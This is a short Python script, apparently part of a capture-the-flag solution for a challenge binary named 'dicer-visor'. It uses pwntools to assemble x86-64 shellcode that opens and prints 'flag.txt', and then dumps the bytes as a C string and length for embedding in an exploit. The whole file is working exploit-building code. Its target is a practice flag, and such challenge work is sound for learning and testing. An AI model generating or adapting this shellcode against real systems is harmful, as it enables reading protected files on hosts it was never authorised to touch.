
from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./dicer-visor')

def dumpShellcode(shellcode):
    shellcode_str = ''
    for b in shellcode:
        shellcode_str += "\\x{:02x}".format(b)
    msg  = f'const char *shellcode = "{shellcode_str}";\n'
    msg += f'const size_t shellcode_len = {len(shellcode)};'
    print(msg)

shellcode  = b''
shellcode += asm(
    '''
    xor     rdx, rdx /* O_RDONLY */
    ''' +
    pwnlib.shellcraft.linux.cat("flag.txt")
)
dumpShellcode(shellcode)
